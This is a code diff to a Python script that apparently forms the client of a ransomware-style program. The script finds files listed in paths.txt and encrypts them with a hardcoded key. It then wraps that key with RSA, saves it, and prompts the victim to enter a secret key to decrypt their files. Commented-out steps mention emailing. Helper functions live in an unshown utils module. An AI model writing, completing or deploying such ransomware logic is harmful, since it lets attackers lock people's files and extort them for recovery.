@@ -17,16 +17,21 @@ how the pipeline works (when you run the client.exe file):
     key input in order to decrypt the files back. "Enter Key to decrypt" [Pending] <----------------
 15. After the key is entered, the files will be decrypted and the prompt will close [Pending] <----------------
 """
-# import functions from utils.py
 from utils import *
 
+
+# Continue with the rest of your program logic
+
+waitingForKey("start")
 #1
 ascii_key= "vG7pyhyrDzSnqcJ8"
 #generate_key(16)
 
 #2
 file_contains_paths ="paths.txt"
-findTxtFile( file_contains_paths )
+txtFileCounter = findTxtFile( file_contains_paths )
+print("Files Found: ", txtFileCounter)
+
 
 #3
 encrypt_file_paths(ascii_key, file_contains_paths)
@@ -50,8 +55,12 @@ encoded_encrypted_msg = encryptWithRSA(byte_ascii_key, public_key)
 #8
 saveKey(encoded_encrypted_msg.decode(), "encryptedKey.key")
 
+#9
+waitingForKey(ascii_key, message="Enter the secret key to DECRYPT FILES: ")
+encrypt_file_paths(ascii_key, file_contains_paths)
 
 
+'''
 #d2=decrypt_data(ascii_key ,encrypted_data )
 #print(encoded_encrypted_msg.decode())
 #print(d)
@@ -73,3 +82,4 @@ saveKey(encoded_encrypted_msg.decode(), "encryptedKey.key")
 # send_to_emails(emails)
 
 #13
+'''
